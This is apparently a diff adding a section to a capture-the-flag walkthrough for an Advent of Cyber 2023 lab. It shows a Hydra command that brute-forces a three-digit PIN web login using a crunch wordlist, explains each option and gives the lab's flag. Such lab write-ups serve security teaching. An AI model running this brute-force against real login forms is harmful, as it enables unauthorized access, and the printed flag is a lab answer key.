@@ -87,3 +87,38 @@ Crunch will now generate the following number of lines: 4096
 
 crunch: 100% completed generating output
 ```
+
+
+## Password Cracking with Hydra
+
+1. **Objective:** Utilize `Hydra` to crack the password using the previously created wordlist and access the control system.
+
+2. **Procedure:**
+   - Use the following `hydra` command:
+   
+     ```bash
+     hydra -l '' -P 3digits.txt -f -v MACHINE-IP http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
+     ```
+   
+   - Explanation of the command:
+     - `-l ''`: Specifies an empty username.
+     - `-P 3digits.txt`: Specifies the password list generated using `crunch`.
+     - `-f`: Stops the attack upon successful password discovery.
+     - `-v`: Enables verbose mode.
+     - `http-post-form "/login.php:pin=^PASS^:Access denied"`: Defines the login form parameters.
+     - `-s 8000`: Specifies the port.
+
+3. **Unlocking the Device:**
+   - After obtaining the password, log in using the discovered PIN code.
+   - Unlock the device to retrieve the flag.
+
+4. **Flag:**
+   - The flag is revealed upon successfully unlocking the device:
+
+![image](https://github.com/W4W1R3/Advent-Of-Cyber-2023-Walkthroughs/assets/57982315/323d8f1d-05e5-40ca-be5d-5150e83e97f2)
+
+   
+     ```
+     THM{pin-code-brute-force}
+     ```
+
